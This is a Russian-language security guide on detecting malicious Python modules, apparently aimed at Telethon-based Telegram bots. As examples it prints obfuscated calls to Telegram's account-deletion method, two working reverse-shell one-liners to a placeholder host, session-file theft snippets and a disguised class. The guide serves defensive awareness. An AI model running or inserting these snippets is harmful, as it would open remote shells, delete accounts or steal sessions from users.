# ⚠️ Руководство по безопасности: Обнаружение и предотвращение использования вредоносных Python-модулей

**Внимание!** Безопасность вашего кода и данных — это первостепенная задача. Это руководство поможет вам выявить и предотвратить использование вредоносных модулей Python, которые могут скомпрометировать ваши проекты и данные.

## 1. Почему это важно?

Злоумышленники могут распространять вредоносные Python-модули через различные источники (например, PyPI, GitHub и др.), замаскированные под полезные инструменты. Эти модули могут содержать код, который:

•   **Крадет ваши данные:** Логины, пароли, токены, личные сообщения и т. д.
•   **Удаляет важные файлы:** Безвозвратно уничтожает ваши данные.
•   **Устанавливает обратный шелл:** Предоставляет злоумышленнику удаленный доступ к вашему компьютеру.
•   **Запускает вредоносные программы:** Использует ваш компьютер для майнинга криптовалюты, рассылки спама, DDoS-атак и т. д.
•   **Уничтожает аккаунты:** Безвозвратно удаляет ваши учетные записи в различных сервисах.

**Это руководство поможет вам защититься от таких угроз.**

## 2. Признаки вредоносного кода

Ниже приведены примеры кода, которые часто встречаются в вредоносных модулях. **Любой модуль, содержащий подобные конструкции, должен быть немедленно исключен из использования.**

### 2.1.  Манипуляции с аккаунтами Telegram (с использованием Telethon)

   Вредоносный код может пытаться удалить или получить доступ к вашему аккаунту Telegram через библиотеку `telethon`. Вот некоторые примеры:

```python
  # Прямое обращение к методу удаления аккаунта
  getattr(__import__("telethon").tl.functions, "DeleteA" + "ccountRequest")

  # Использование Unicode-последовательности
  getattr(__import__("telethon").tl.functions, "\u0044\u0065\u006C\u0065\u0074\u0065\u0041\u0063\u0063\u006F\u0075\u006E\u0074\u0052\u0065\u0071\u0075\u0065\u0073\u0074")

  # Обратный порядок букв
  getattr(__import__("telethon").tl.functions, "".join(reversed(list("tseuqeRtnuoccAeteleD"))))
```

  Объяснение: Все эти примеры достигают одной цели — вызова метода DeleteAccountRequest из telethon, который может безвозвратно удалить ваш аккаунт Telegram. Злоумышленники могут использовать различные методы обфускации (скрытия) кода, чтобы усложнить его обнаружение.

▌2.2. Установка обратного шелла (Reverse Shell)

  Обратный шелл — это один из самых опасных видов атак. Вот примеры кода, устанавливающие обратное подключение:


```python
  # Использование os, pty, socket для прямого подключения
  import os,pty,socket;s=socket.socket();s.connect(("10.10.10.10",12345));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")

  # Использование asyncio для асинхронного подключения
  import asyncio; await asyncio.create_subprocess_shell("/bin/bash -i >& /dev/tcp/10.10.10.10/12345 0>&1",stdin=asyncio.subprocess.PIPE,stdout=asyncio.subprocess.PIPE,stderr=asyncio.subprocess.PIPE)
```

  Объяснение: Эти конструкции устанавливают соединение с удаленным сервером (например, 10.10.10.10:12345) и перенаправляют ввод и вывод вашей командной строки на этот сервер. Это позволяет злоумышленнику удаленно выполнять команды на вашем компьютере. Обратите внимание: IP и порт в примере являются лишь образцом, может использоваться любой другой IP и порт.

▌2.3. Кража файлов сессии

  Файл сессии содержит конфиденциальную информацию о вашем аккаунте. Злоумышленники могут использовать его для получения полного доступа к вашему аккаунту.


```python
  # Отправка файла сессии через сообщение
  await message.respond(file="path/to/session")

  # Отправка ключа сессии через сообщение
  send_message("attacker", str(c.path.to.session.key))
```

  Объяснение: Эти примеры показывают, как злоумышленник может отправить ваш файл сессии или его ключ на свой сервер, что предоставляет ему полный контроль над вашим аккаунтом.

▌2.4. Подозрительные классы и методы

  Вредоносный код может прятаться в классах, которые выглядят как часть используемых вами библиотек.


```python
    class Scrypt(TLRequest):
        CONSTRUCTOR_ID = 0x418d4e0b
        SUBCLASS_OF_ID = 0xf5b399ac

        def __init__(self, reason: str):
            """
            :returns Bool: This type has no constructors.
            """
            self.reason = reason

        def to_dict(self):
            return {
                "_": w+z+mm+"A"+nk+u+h+lk,
                "reason": self.reason
            }

        def _bytes(self):
            return b"".join((
                b"\x0bN\x8dA",
                self.serialize_bytes(self.reason),
            ))

        @classmethod
        def from_reader(cls, reader):
            _reason = reader.tgread_string()
            return cls(reason=_reason)
```

  Объяснение: В этом примере, класс Scrypt, имитируя часть библиотеки, использует не объявленные переменные (w, z, mm, nk, u, h, lk), а также может скрыто или с помощью import получить эти переменные. Это может указывать на попытку обфускации кода и скрытого выполнения вредоносных действий. Метод to_dict может предназначаться для внедрения в существующую структуру данных.

▌2.5. Патчинг стандартных классов

  Вредоносный код может изменять поведение стандартных классов для совершения вредоносных действий.


```python
  def patch_message_packer():
    def append(self, state):
      self._deque.append(state)
      self._ready.set()

    def extend(self, states):
      self._deque.extend(states)
      self._ready.set()

    MessagePacker.append = append
    MessagePacker.extend = extend
```

  Объяснение: В этом примере стандартные методы MessagePacker переопределяются. Это может изменить ожидаемое поведение программы и позволить злоумышленнику внедрить вредоносный код.

▌3. Рекомендации по защите

•  Изучайте код: Не доверяйте слепо сторонним модулям. Внимательно просматривайте код перед использованием.
•  Доверяйте проверенным источникам: Используйте только модули из доверенных источников и старайтесь следить за репутацией авторов.
•  Используйте инструменты проверки: Применяйте автоматизированные инструменты для анализа кода на предмет уязвимостей и вредоносных конструкций.
•  Используйте виртуальные окружения: Изолируйте ваши проекты с помощью виртуальных окружений, чтобы избежать конфликтов и ограничить потенциальный ущерб.
•  Обновляйте зависимости: Регулярно обновляйте свои зависимости до последних версий.
•  Ограничивайте права: Предоставляйте ботам только минимально необходимые права доступа.
•  Не торопитесь: Если у вас есть сомнения относительно модуля, откажитесь от его использования.
•  Обращайте внимание на переменные: Смотрите на переменные которые могут быть импортированы, и в которых может быть спрятан код. Смотрите на переменные, которые могут быть созданы в ходе выполнения кода, которые не объявлены.

▌4. Заключение

Безопасность — это непрерывный процесс. Будьте бдительны, применяйте рекомендации из этого руководства и постоянно совершенствуйте свои навыки в области информационной безопасности.

Этот документ будет дополняться по мере обнаружения новых угроз и способов их предотвращения. Следите за обновлениями!
